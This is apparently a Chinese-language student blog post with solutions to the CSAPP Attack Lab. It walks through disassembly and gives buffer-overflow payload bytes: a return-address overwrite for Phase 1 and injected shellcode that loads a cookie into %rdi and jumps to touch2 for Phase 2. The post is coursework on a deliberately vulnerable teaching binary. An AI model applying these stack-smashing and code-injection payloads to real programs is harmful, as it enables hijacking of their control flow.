---
title: Attack Lab 记录
top_img: false
cover: /img/CSAPP.jpeg
date: 2020-12-16 17:14:09
tags:
- CSAPP
---

## Phase 1

先反汇编得到`getbuf`的代码

```assembly
00000000004017d3 <getbuf>:
  4017d3:	48 83 ec 38          	sub    $0x38,%rsp
  4017d7:	48 89 e7             	mov    %rsp,%rdi
  4017da:	e8 44 02 00 00       	callq  401a23 <Gets>
  4017df:	b8 01 00 00 00       	mov    $0x1,%eax
  4017e4:	48 83 c4 38          	add    $0x38,%rsp
  4017e8:	c3                   	retq   
```

第2行中，申请了0x38字节的空间，然后将栈顶的地址作为参数调用`Gets`。所以`BUFFER_SIZE`是0x38。

这里的逻辑是：`test`函数调用`getbuf`函数，`getbuf`函数再调用`Gets`，而写入字符串的动作在`Gets`函数里。在`test`中`call getbuf`时，将`test`函数（里一条指令）的地址压入了栈，然后在`getbuf`中`call Gets`时，再将`getbuf`的一条指令地址压入栈（这里其实是代码里第五条指令）。也就是说，能更改的只能是第一次压入栈的地址，因为它处于为字符串分配的空间的高地址处。因此需要改变的行为是：让`getbuf`返回时，让它不回到`test`而前往`touch1`。

找到`touch1`的汇编

```assembly
00000000004017e9 <touch1>:
  4017e9:	48 83 ec 08          	sub    $0x8,%rsp
  4017ed:	c7 05 05 2d 20 00 01 	movl   $0x1,0x202d05(%rip)        # 6044fc <vlevel>
  4017f4:	00 00 00 
  4017f7:	48 8d 3d bd 17 00 00 	lea    0x17bd(%rip),%rdi        # 402fbb <_IO_stdin_used+0x2cb>
  4017fe:	e8 2d f4 ff ff       	callq  400c30 <puts@plt>
  401803:	bf 01 00 00 00       	mov    $0x1,%edi
  401808:	e8 2d 04 00 00       	callq  401c3a <validate>
  40180d:	bf 00 00 00 00       	mov    $0x0,%edi
  401812:	e8 99 f5 ff ff       	callq  400db0 <exit@plt>
```

那就很简单了，只要把前0x38个字符先随便填，然后把`touch1`的地址写入就好了。（小端）

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
e9 17 40 00 00 00 00 00
```

## Phase 2

Phase 2 有个额外的要求就是把Cookie当作参数传入，我的Cookie是`0x615ab299`。那单单修改返回地址就不够了，因为程序正常执行时，并不会把Cookie传入`%rdi`，那只要把指令写到栈中，让它`ret`到我的指令上就可以了。那该如何再回到`touch2`呢？我的做法是将Cookie传入`%rdi`后，再往栈中压入`touch2`的地址，再`ret`。

touch2的地址：0x401817

我需要插入三条指令，让`getbuf`遇到`ret`后先来到我的指令，然后再前往`touch2`

```assembly
getbuf:
  sub    $0x38,%rsp
  mov    %rsp,%rdi
  callq  401a23 <Gets>
  mov    $0x1,%eax
  add    $0x38,%rsp
  retq
MyAss:
  movq	 $0x615ab299, %rdi
  push	 $0x401817
  ret
```

最后用gcc和objdump就能得到源码

```assembly
48 c7 c7 99 b2 5a 61 /* movq	 $0x615ab299, %rdi */
68 17 18 40 00 /* push	 $0x401817 */
c3 /* ret */
00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
08 ec 66 55 00 00 00 00 /* 0x38个字节的首地址，也就是我的指令的初始地址*/
```

## Phase 3 & 4 & 5

phase 3和4自己做出来了

phase 5自己没琢磨清楚，百度教我做出来了。有空再写一下。